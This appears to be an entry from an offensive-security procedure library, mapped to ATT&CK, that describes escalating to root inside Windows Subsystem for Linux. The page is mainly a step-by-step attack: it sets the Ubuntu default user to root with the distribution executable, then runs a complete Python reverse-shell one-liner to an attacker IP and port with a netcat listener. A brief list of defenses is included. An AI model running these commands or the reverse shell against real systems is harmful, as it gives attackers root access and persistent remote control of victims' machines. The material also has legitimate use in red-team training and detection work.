---
id: 2706ca6f-6568-407a-a9c0-392910b195a2
name: WSL-Privilege-Escalation-via-Default-User-Modification
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.622312+00:00'
updated_at: '2023-04-10T20:37:54.936219+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/EoP - Windows Subsystem for Linux (WSL)]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/check-wsl-current-user]]'
  - '[[commands/set-ubuntu-default-user-to-root]]'
  - '[[commands/verify-wsl-user-root]]'
  - '[[commands/install-python-in-wsl]]'
  - '[[commands/execute-wsl-python-reverse-shell]]'
  - '[[commands/list-wsl-distributions]]'
platforms:
  - Windows
tools: []
validated: true
---

# WSL-Privilege-Escalation-via-Default-User-Modification

## Summary

This procedure exploits the Windows Subsystem for Linux (WSL) configuration to escalate privileges from a low-privileged user to root within the WSL environment. By modifying the default user for the Ubuntu distribution to root, an attacker can execute commands with elevated privileges, bypassing standard user restrictions and enabling further post-exploitation activities such as establishing a reverse shell for persistent access.

## Description

WSL allows Linux distributions to run natively on Windows 10 and later versions, creating isolated environments with their own filesystems and processes. By default, WSL instances run as the user who launched them, but the default user can be reconfigured using distribution-specific executables. This procedure targets Ubuntu on WSL, using the distribution executable to set the default user to root, which grants unrestricted access within the WSL instance. This escalation can be used to run arbitrary code, access sensitive files, or pivot to the host Windows system if further vulnerabilities exist. The technique abuses WSL's configuration flexibility rather than a direct vulnerability, making it effective in environments where WSL is enabled but not hardened. Prerequisites include having WSL and an Ubuntu distribution installed, with access to the Windows command line.

## Requirements

1. Windows 10 or later with WSL enabled and an Ubuntu distribution installed (e.g., Ubuntu 16.04 or later).
2. Low-privileged user account on the Windows host with permission to execute WSL commands.
3. Access to the Ubuntu distribution executable (e.g., ubuntu.exe or ubuntu1604.exe) in the installation path.
4. Python3 installed within the WSL Ubuntu instance (or administrative access to install it).
5. Attacker-controlled listener for reverse shell (e.g., netcat on a remote host).

## Defense

- Disable WSL via Windows Features if not required for legitimate use.
- Apply all Windows and WSL updates to mitigate known vulnerabilities.
- Monitor wsl.exe and distribution executables (e.g., ubuntu.exe) for unusual configurations or executions using process monitoring tools like Sysmon.
- Enforce least-privilege principles by running WSL under restricted user accounts and auditing default user settings.
- Enable Windows Defender or EDR solutions to detect anomalous Python executions or network connections from WSL.

## Objectives

1. Verify the current WSL user context to confirm low-privilege starting point.
2. Modify the Ubuntu WSL distribution to set the default user to root for privilege escalation.
3. Confirm the escalation by rechecking the user context.
4. Install necessary dependencies like Python if absent.
5. Establish a root-level reverse shell within WSL for persistent control.

## Instructions

### Step 1: Check Current WSL User

**Context**: Begin by verifying the current default user in the WSL Ubuntu instance to establish the baseline privilege level. This helps confirm that the instance is running as a non-root user, setting the stage for escalation.

**Command** ([[commands/check-wsl-current-user]]):
```powershell
wsl whoami
```

> This command queries the current user identity within the WSL environment. If successful, it will output the username (e.g., 'user'), indicating non-root access. If root is already set, the procedure may not be necessary.

### Step 2: Set Default User to Root

**Context**: Use the Ubuntu distribution executable to reconfigure the default user to root. This modifies the WSL instance startup behavior, allowing subsequent sessions to run with elevated privileges without explicit sudo usage.

**Command** ([[commands/set-ubuntu-default-user-to-root]]):
```powershell
ubuntu.exe config --default-user root
```

> Execute this from the Windows PowerShell or Command Prompt where the Ubuntu executable is accessible (typically in the PATH after installation). No output is expected on success; errors may indicate incorrect executable name or permissions. Note: Replace 'ubuntu.exe' with the exact executable for your distribution (e.g., 'ubuntu1604.exe' for older versions).

### Step 3: Verify Escalation to Root User

**Context**: Re-run the user check to validate that the default user modification took effect. This confirms the privilege escalation within WSL.

**Command** ([[commands/verify-wsl-user-root]]):
```powershell
wsl whoami
```

> The output should now display 'root', indicating successful escalation. If it still shows the previous user, restart the WSL instance with 'wsl --shutdown' and retry.

### Step 4: Install Python in WSL if Needed

**Context**: Ensure Python3 is available within the WSL environment for executing reverse shell code. This step runs inside the Ubuntu instance to update packages and install Python.

**Command** ([[commands/install-python-in-wsl]]):
```bash
sudo apt-get update && sudo apt-get install -y python3
```

> Run this within the WSL Ubuntu shell (invoke with 'wsl'). The command updates the package list and installs Python3 silently. Expected output includes progress messages and confirmation of installation. If Python is already present, it will skip installation.

### Step 5: Execute Python Reverse Shell

**Context**: With root privileges confirmed, execute a Python-based reverse shell to connect back to the attacker. Replace the placeholder code with actual reverse shell payload for outbound connection.

**Command** ([[commands/execute-wsl-python-reverse-shell]]):
```powershell
wsl python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
```

> This invokes Python within WSL to run a TCP reverse shell script. Ensure a listener (e.g., nc -lvnp $ATTACKER_PORT) is running on the attacker side. Success is indicated by an incoming shell connection. The code connects to the specified IP and port, redirects I/O, and spawns a shell.
